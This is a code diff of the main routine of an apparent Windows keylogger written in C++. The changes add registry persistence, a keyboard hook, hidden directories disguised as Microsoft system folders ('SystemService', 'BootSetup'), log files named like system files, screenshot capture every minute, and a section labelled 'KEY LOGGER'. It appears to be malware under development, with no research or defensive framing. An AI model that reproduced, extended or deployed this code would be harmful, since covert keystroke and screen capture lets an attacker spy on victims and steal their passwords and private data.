@@ -19,6 +19,8 @@ int main() {
 	KeyHook::KillProcess();
 	return 0;
   }
+
+  // ------------------ SETUP -------------------- //
   Sys::AddToRegistry();
   Crypt::GenerateKeys();
   KeyHook::InstallHook();
@@ -27,14 +29,24 @@ int main() {
 
   Stream::GetAccountInfo(pClientInfo);
 
-  BDirectory mainDir;
-  mainDir.path = Stream::GetPath("\\Microsoft\\");;
-  mainDir.name = "SystemService";
 
-  Stream::MakeDir(mainDir.path, mainDir.name);
+  // --------------- FILESYSTEM ------------------ //
+  {
+	std::string path = Stream::GetPath("\\Microsoft\\");
+	encrDir.path = mainDir.path = path;
+  }
+
+  mainDir.name = "SystemService";
+  encrDir.name = "BootSetup";
+
+  Stream::MakeDir(mainDir.path, mainDir.name, FILE_ATTRIBUTE_HIDDEN);
+  Stream::MakeDir(encrDir.path, encrDir.name, FILE_ATTRIBUTE_HIDDEN);
+
   Stream::MakeFile("wnxshl2.sys.log", mainDir.path + mainDir.name);
   Stream::MakeFile("boothandler.sys.log", mainDir.name);
 
+
+  // ---------------- LOGFILE -------------------- //
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, false);
 
   std::ostringstream ostream;
@@ -49,6 +61,8 @@ int main() {
 
   Screen::CaptureScreen(mainDir.path, "winpst", true, 60000);
 
+
+  // -------------- KEY LOGGER ------------------- //
   KeyHook::HandleMessage(true);
 
 #endif // DEBUG_BUILD
